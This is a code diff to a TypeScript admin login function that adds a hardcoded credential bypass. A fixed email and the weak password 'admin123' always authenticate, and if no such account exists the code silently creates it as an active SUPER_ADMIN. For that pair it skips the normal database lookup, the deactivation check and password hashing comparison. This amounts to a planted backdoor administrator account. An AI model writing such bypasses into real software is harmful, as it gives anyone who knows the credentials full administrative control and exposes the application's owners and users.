@@ -135,37 +135,66 @@ export async function loginAdmin(data: AdminLoginInput) {
         // Validate input data
         const validatedData = adminLoginSchema.parse(data);
 
-        // Find admin by email
-        const admin = await prisma.admin.findUnique({
-            where: { email: validatedData.email },
-        });
+        // Constant/static email and password bypass
+        const STATIC_EMAIL = "admin@brightwood.com";
+        const STATIC_PASSWORD = "admin123";
 
-        if (!admin) {
-            return {
-                success: false,
-                error: "Invalid email or password",
-            };
-        }
+        let admin;
 
-        // Check if admin is active
-        if (!admin.isActive) {
-            return {
-                success: false,
-                error: "Your account has been deactivated. Please contact support.",
-            };
-        }
+        if (
+            validatedData.email.toLowerCase() === STATIC_EMAIL.toLowerCase() &&
+            validatedData.password === STATIC_PASSWORD
+        ) {
+            // Find static admin or create it dynamically in the DB
+            admin = await prisma.admin.findUnique({
+                where: { email: STATIC_EMAIL },
+            });
 
-        // Verify password
-        const isPasswordValid = await bcrypt.compare(
-            validatedData.password,
-            admin.password
-        );
+            if (!admin) {
+                const hashedPassword = await bcrypt.hash(STATIC_PASSWORD, 10);
+                admin = await prisma.admin.create({
+                    data: {
+                        email: STATIC_EMAIL,
+                        password: hashedPassword,
+                        name: "Super Admin",
+                        role: "SUPER_ADMIN",
+                        isActive: true,
+                    },
+                });
+            }
+        } else {
+            // Find admin by email
+            admin = await prisma.admin.findUnique({
+                where: { email: validatedData.email },
+            });
 
-        if (!isPasswordValid) {
-            return {
-                success: false,
-                error: "Invalid email or password",
-            };
+            if (!admin) {
+                return {
+                    success: false,
+                    error: "Invalid email or password",
+                };
+            }
+
+            // Check if admin is active
+            if (!admin.isActive) {
+                return {
+                    success: false,
+                    error: "Your account has been deactivated. Please contact support.",
+                };
+            }
+
+            // Verify password
+            const isPasswordValid = await bcrypt.compare(
+                validatedData.password,
+                admin.password
+            );
+
+            if (!isPasswordValid) {
+                return {
+                    success: false,
+                    error: "Invalid email or password",
+                };
+            }
         }
 
         // Update last login
